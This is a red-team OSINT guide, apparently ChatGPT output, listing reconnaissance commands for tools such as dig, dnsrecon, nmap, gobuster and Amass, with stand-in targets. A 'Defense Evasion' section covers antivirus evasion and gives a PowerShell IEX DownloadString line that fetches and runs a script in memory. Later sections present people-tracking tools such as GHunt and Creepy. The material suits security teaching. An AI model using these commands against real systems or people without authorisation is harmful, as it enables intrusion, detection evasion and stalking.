Red Team OSINT Tools: Comprehensive Guide

OSINT (Open Source Intelligence) is a crucial component of Red Team operations, allowing security professionals to gather information about their targets using publicly available sources. This guide provides an overview of tools and commands used in both passive and active reconnaissance, as well as frameworks and techniques for evasion.
Passive Reconnaissance

1. Host Command

    Introduction: The host command is a simple DNS lookup utility. It’s used to resolve IP addresses from domain names and vice versa.
    Command Example:

    bash

    host hacker.com

    This command returns the IP address associated with the domain hacker.com.

2. Nslookup

    Introduction: nslookup is a network administration tool for querying the Domain Name System (DNS) to obtain domain name or IP address mapping.
    Command Example:

    bash

    nslookup hacker.com

    This command will return the IP address and DNS details of the hacker.com domain.

3. Traceroute

    Introduction: traceroute tracks the path that packets take from your machine to a destination host, which is useful for understanding the network structure of your target.
    Command Example:

    bash

    traceroute hacker.com

    This traces the route that packets take to reach hacker.com, displaying each hop on the way.

4. Dnsrecon

    Introduction: Dnsrecon is a DNS enumeration tool that can perform multiple types of DNS queries and checks, including standard DNS records, zone transfers, and brute-force attacks on subdomains.
    Command Example:

    bash

    dnsrecon -d hacker.com

    This command queries DNS records related to hacker.com.

5. Wafw00f

    Introduction: Wafw00f identifies and fingerprints web application firewalls (WAFs) on the target domain.
    Command Example:

    bash

    wafw00f hacker.com

    This scans hacker.com to detect if a WAF is present.

6. Dig

    Introduction: dig is a flexible DNS query tool that can retrieve DNS records such as A, MX, TXT, and more.

    Command Examples:

    bash

dig hacker.com

Retrieves A records for hacker.com.

bash

    dig hacker.com ANY

    Retrieves all available DNS records for hacker.com.

7. Whois

    Introduction: whois is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name or IP address block.
    Command Example:

    bash

    whois hacker.com

    This provides detailed information about the domain registration of hacker.com.

8. Netcraft

    Introduction: Netcraft provides detailed information about websites, including hosting details, technologies used, and site history.
    Usage: Visit Netcraft and input the target domain to gather detailed site information.

9. Dnsdumpster

    Introduction: Dnsdumpster is an online tool used for mapping a target domain’s attack surface, including DNS records and mail server configurations.
    Usage: Visit Dnsdumpster and enter the target domain for a comprehensive DNS record dump.

10. Whatweb

    Introduction: Whatweb identifies websites by discovering information about their underlying technologies, including content management systems (CMS), server versions, and more.
    Command Example:

    bash

    whatweb hacker.com

    This identifies the technologies used by hacker.com.

11. Firefox Plugins (Wappalyzer)

    Introduction: Wappalyzer is a browser extension that detects the technologies used on websites, including CMS, programming languages, and analytics tools.
    Usage: Install Wappalyzer from the Firefox add-ons store, then visit the target site to see its technologies.

12. TheHarvester

    Introduction: TheHarvester is used to gather emails, subdomains, IPs, and URLs using multiple public data sources like search engines and social media platforms.
    Command Example:

    bash

    theharvester -d hacker.com -b google

    This gathers emails and subdomains from Google for the domain hacker.com.

13. Sublist3r

    Introduction: Sublist3r is a tool designed to enumerate subdomains of websites using OSINT.
    Command Example:

    bash

    sublist3r -d hacker.com

    This enumerates subdomains for hacker.com.

14. Google Dorks

    Introduction: Google Dorking uses advanced search queries to find information that is not readily visible via normal search results.
    Command Example:

    bash

    site:*.bbc.com -site:www.bbc.com

    This query returns subdomains of bbc.com excluding the main site.

Active Reconnaissance

1. Dnsrecon (Zone Transfer)

    Introduction: Dnsrecon can attempt a DNS zone transfer, which could expose all DNS records if misconfigured.
    Command Example:

    bash

    dnsrecon -d hacker.com -t axfr

    Attempts a zone transfer for hacker.com.

2. Fierce

    Introduction: Fierce is a DNS reconnaissance tool used to locate non-contiguous IP space and hostnames.
    Command Example:

    bash

    fierce --domain hacker.com

    Performs a subdomain brute-force attack on hacker.com.

3. Knockpy

    Introduction: Knockpy is a Python tool that performs DNS enumeration via a brute-force attack, leveraging a dictionary of subdomains.
    Command Example:

    bash

    knockpy hacker.com

    This tool attempts to discover subdomains for hacker.com.

4. Nmap

    Introduction: Nmap is a powerful network scanning tool used to discover hosts and services on a computer network.
    Command Example:

    bash

    nmap -sS -sV -F <ip address> -oN output.txt

    This command performs a stealth scan, version detection, and saves the output to a file.

5. Searchsploit

    Introduction: Searchsploit is a command-line tool for searching Exploit-DB. It helps find exploits related to specific vulnerabilities or software versions.
    Command Example:

    bash

    searchsploit heartbleed

    Searches for exploits related to the Heartbleed vulnerability.

6. Nikto

    Introduction: Nikto is a web server scanner that checks for vulnerabilities such as outdated server software and dangerous files.
    Command Example:

    bash

    nikto -h hacker.com

    Scans hacker.com for common vulnerabilities.

7. Dirb and Gobuster

    Introduction: Dirb and Gobuster are tools for brute-forcing directories and files on web servers.

    Command Example (Dirb):

    bash

dirb http://hacker.com/

Brute-forces directories on hacker.com.

Command Example (Gobuster):

bash

    gobuster dir -u http://hacker.com/ -w /path/to/wordlist.txt

    This uses Gobuster to find directories on hacker.com using a wordlist.

8. Cmsmap

    Introduction: Cmsmap is a Python tool to automatically scan CMS installations for known vulnerabilities.
    Command Example:

    bash

    cmsmap http://hacker.com

    Scans hacker.com for CMS vulnerabilities.

Frameworks for Reconnaissance

1. Sniper

    Introduction: Sniper is an automated scanner for vulnerability assessment, penetration testing, and OSINT gathering.

    Command Examples:

    bash

sniper -t hacker.com

Performs an active scan on hacker.com.

bash

    sniper -t hacker.com -m stealth -o -re

    Conducts a passive scan with Sniper.

2. Amass

    Introduction: Amass is an OWASP project designed for in-depth domain enumeration and OSINT.

    Command Examples:

    bash

amass intel -whois hacker.com -dir /path/to/output/

Performs WHOIS lookups on domains associated with hacker.com.

bash

amass enum -d hacker.com -dir /path/to/output/

Enumerates subdomains for hacker.com.

bash

amass enum -d hacker.com -scr -ip -dir /path/to/output/

Enumerates subdomains and associated IPs for hacker.com.

bash

    amass db -dir /path/to/results/ -d3

    Queries the Amass database for detailed information.

3. Recon-ng

    Introduction: Recon-ng is a full-featured web reconnaissance framework with independent modules, database interaction, built-in convenience functions, and interactive help.
    Command Examples:

    bash

    recon-ng
    marketplace search whois
    marketplace install <module>
    modules load <module>
    options set SOURCE hacker.com
    run

    This workflow shows how to set up and run a module in Recon-ng for domain enumeration.

Red Team Defense Evasion

1. Antivirus Evasion

    Introduction: Antivirus software uses various methods like signature detection, heuristics, and behavioral analysis to detect and block malware. Red Teams must learn to evade these mechanisms.
    Evasion Techniques:
        Obfuscation: Hides the true intent of malicious code.
        Encoding: Converts code into a different format to evade detection.
        Packing: Compresses or encrypts the executable.
        Crypters: Encrypts the payload or the entire executable to bypass antivirus detection.

2. In-Memory Evasion

    Introduction: In-memory evasion techniques are becoming more prevalent, as they avoid writing to disk, reducing the likelihood of detection by traditional antivirus solutions.
    Tools: PowerShell scripts like Invoke-Obfuscation can be used to obfuscate scripts in memory.
    Command Example:

    bash

    sudo apt install powershell
    pwsh -c 'IEX (New-Object Net.WebClient).DownloadString("https://path/to/Invoke-Obfuscation.ps1")'

    This command installs PowerShell and downloads an obfuscation script for in-memory execution.

additional tools and frameworks that can significantly enhance your OSINT and reconnaissance capabilities. These tools cover various aspects of information gathering, from social media analysis to network scanning and vulnerability assessment. Here are some more tools you might find useful:
Additional OSINT Tools

1. Maltego

    Introduction: Maltego is a powerful OSINT and graphical link analysis tool for gathering and connecting information for investigative tasks. It provides an interactive data mining platform that renders directed graphs for analyzing relationships between pieces of information.
    Usage: Maltego can be used for mapping the online presence of an individual or organization, uncovering relationships, and conducting deep network analysis.
    Website: Maltego

2. SpiderFoot

    Introduction: SpiderFoot is an open-source reconnaissance tool that automates the process of gathering intelligence about a target. It integrates with various APIs and has a web-based interface.
    Command Example:

    bash

    spiderfoot -l 127.0.0.1:5001

    This command starts SpiderFoot on the specified IP address and port, allowing you to access it via a web browser.
    Website: SpiderFoot

3. Shodan

    Introduction: Shodan is a search engine for Internet-connected devices. It allows you to discover vulnerable devices, webcams, servers, and more by searching for specific ports, services, or vulnerabilities.
    Usage: Shodan can be used to identify exposed devices, discover vulnerabilities, and assess the security posture of a network.
    Website: Shodan

4. Censys

    Introduction: Censys is a search engine that provides a snapshot of the entire internet, allowing you to search for and analyze devices, certificates, and other entities.
    Usage: Similar to Shodan, Censys can be used for discovering exposed assets, vulnerabilities, and understanding the attack surface.
    Website: Censys

5. ReconDog

    Introduction: ReconDog is a simple, all-in-one tool used to perform various passive and active reconnaissance techniques, such as whois lookups, DNS record retrieval, subdomain enumeration, and more.
    Command Example:

    bash

    python recondog.py

    This launches ReconDog's interactive menu, where you can select different reconnaissance options.
    GitHub: ReconDog

6. Hunchly

    Introduction: Hunchly is a web capture tool specifically designed for investigators. It automatically captures web pages as you browse, ensuring that no crucial evidence is lost.
    Usage: Ideal for OSINT investigations where documenting and preserving web-based evidence is critical.
    Website: Hunchly

7. Datasploit

    Introduction: Datasploit is an OSINT framework designed to help with the reconnaissance of companies, domains, IP addresses, individuals, and more.
    Command Example:

    bash

    python datasploit.py -d hacker.com

    This command initiates a comprehensive OSINT scan on hacker.com.
    GitHub: Datasploit

8. OSINT Framework

    Introduction: The OSINT Framework is a collection of OSINT tools and resources organized by categories like people search, phone numbers, email, and more.
    Usage: This framework provides a centralized resource for finding the best OSINT tools available for different types of investigations.
    Website: OSINT Framework

9. Social-Engineer Toolkit (SET)

    Introduction: SET is a penetration testing framework designed for social engineering. It automates attacks like spear-phishing, credential harvesting, and payload delivery.
    Command Example:

    bash

    sudo setoolkit

    Launches the SET interactive menu for selecting different attack vectors.
    Website: SET

10. GHunt

    Introduction: GHunt is a tool that enables you to gather information about Google accounts using email addresses. It can reveal the victim's location, Google services used, and even photos from Google Photos.
    Command Example:

    bash

    python ghunt.py email@example.com

    This command gathers OSINT from the provided Google account.
    GitHub: GHunt

Additional Reconnaissance Tools
1. Masscan

    Introduction: Masscan is the fastest Internet port scanner, capable of scanning the entire Internet in less than 6 minutes. It produces similar results to Nmap, but operates much faster.
    Command Example:

    bash

    masscan -p1-65535 --rate=10000 <ip-range>

    This scans the specified IP range at a rate of 10,000 packets per second.
    GitHub: Masscan

2. Axiom

    Introduction: Axiom is a dynamic infrastructure framework that allows you to deploy multiple virtual machines and run mass reconnaissance tools across them, effectively scaling your reconnaissance efforts.
    Usage: Ideal for large-scale operations where you need to gather information from many different sources simultaneously.
    GitHub: Axiom

3. FOCA

    Introduction: FOCA (Fingerprinting Organizations with Collected Archives) is a tool used for analyzing metadata from online documents. It can reveal a lot of information about an organization, such as usernames, paths, emails, software, and operating systems.
    Usage: FOCA is particularly useful for footprinting a target organization by analyzing publicly available documents.
    Website: FOCA

4. Reconftw

    Introduction: Reconftw is a tool designed to perform automated recon on a domain and find maximum vulnerabilities. It can perform subdomain enumeration, vulnerability detection, and more.
    Command Example:

    bash

    ./reconftw.sh -d hacker.com -a

    This runs a full reconnaissance scan on hacker.com.
    GitHub: Reconftw

5. Aquatone

    Introduction: Aquatone is a tool for visual inspection of websites across a large number of hosts. It takes screenshots of websites and then creates an interactive HTML report.
    Command Example:

    bash

    cat domains.txt | aquatone

    This takes screenshots of websites listed in domains.txt.
    GitHub: Aquatone

Dark Web and Anonymity Tools
1. Tor Browser

    Introduction: The Tor Browser is designed for anonymous browsing and accessing the dark web. It routes traffic through the Tor network, anonymizing your connection.
    Usage: Ideal for accessing and researching hidden services or conducting OSINT while preserving anonymity.
    Website: Tor Project

2. OnionSearch

    Introduction: OnionSearch is a tool that automates the search for information on the dark web. It can search for keywords across various dark web services.
    Command Example:

    bash

    python3 onionsearch.py keyword

    This searches the dark web for the specified keyword.
    GitHub: OnionSearch

3. Tails

    Introduction: Tails is a portable operating system that protects your privacy and anonymity by running from a USB stick independently of the computer’s original OS.
    Usage: Tails is ideal for conducting investigations that require strong anonymity and protection against surveillance.
    Website: Tails

Miscellaneous OSINT Tools
1. Metagoofil

    Introduction: Metagoofil is an OSINT tool used to extract metadata from public documents (PDF, DOC, XLS, PPT, etc.) found on a target’s website. It can reveal useful information such as usernames, software versions, and server paths.
    Command Example:

    bash

    metagoofil -d hacker.com -t doc,pdf -l 100 -o /path/to/output/ -f results.html

    This extracts metadata from documents on hacker.com.
    GitHub: Metagoofil

2. Creepy

    Introduction: Creepy is a geolocation OSINT tool that gathers geolocation-related information from social networking platforms and image hosting services to create a map of the target’s locations.
    Usage: Creepy is useful for tracking a person’s movements based on geotagged data from social media.
    Website: Creepy

3. LittleBrother

    Introduction: LittleBrother is an OSINT tool that can gather information on a target without the use of external APIs, making it easy to use for gathering public data on individuals.
    Command Example:

    bash

    python3 LittleBrother.py -p hacker -f john

    This searches for information about a person named John Hacker.
    GitHub: LittleBrother

These tools can further enhance your OSINT and reconnaissance capabilities, making your investigations more comprehensive and effective. Integrating these into your workflow will allow you to gather more in-depth intelligence and identify potential vulnerabilities or risks more effectively.
ChatGPT can make mistakes. Check important info.